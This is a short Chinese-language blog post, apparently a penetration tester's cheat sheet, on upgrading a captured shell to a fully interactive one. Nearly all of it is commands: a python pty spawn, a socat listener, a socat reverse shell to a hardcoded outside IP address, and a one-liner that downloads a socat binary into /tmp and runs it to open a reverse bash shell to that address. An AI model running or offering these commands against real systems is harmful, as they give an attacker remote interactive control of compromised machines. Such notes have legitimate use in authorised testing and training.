---
title: 提升为完全交互式的shell
date: 2024-01-12 21:28:52
tags:
---
## 有python

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
$ stty raw -echo
$ fg
$ reset
$ export SHELL=bash
//$ export TERM=xterm-256color
```

## 无python(Socat)

Socat交互式：

监听
```
socat file:`tty`,raw,echo=0 tcp-listen:8888
nc -lvvp 8888也可以，但是只能半交互式
```

反弹
```
socat TCP:139.159.221.73:8888 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

一键反弹（远程下载socat,要求能访问github,或者自行python开启http）
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:139.159.221.73:8888
```

